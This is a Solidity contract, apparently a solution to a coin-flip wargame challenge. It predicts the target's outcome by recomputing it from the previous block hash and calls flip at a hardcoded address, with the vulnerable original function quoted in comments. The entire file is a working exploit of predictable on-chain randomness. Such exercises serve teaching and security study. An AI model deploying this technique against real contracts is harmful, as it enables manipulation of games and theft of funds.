import "./CoinFlip.sol";



contract DirtyRat {
    CoinFlip public originalContract = CoinFlip (0xae5E8486B66D4c09412660CeA0E6036a087F4Ae5);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    function hackFlip(bool _guess) public {
        // predecir 
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        //si es correcto, submit
        if (side == _guess) {
            originalContract.flip(_guess);
        } else {
            //si es incorrecto lo invertimos 
            originalContract.flip(!_guess);
        }
    }

}

    


//   function flip(bool _guess) public returns (bool) {
//     uint256 blockValue = uint256(blockhash(block.number.sub(1)));

//     if (lastHash == blockValue) {
//       revert();
//     }

//     lastHash = blockValue;
//     uint256 coinFlip = blockValue.div(FACTOR);
//     bool side = coinFlip == 1 ? true : false;

//     if (side == _guess) {
//       consecutiveWins++;
//       return true;
//     } else {
//       consecutiveWins = 0;
//       return false;
//     }
//   }
// }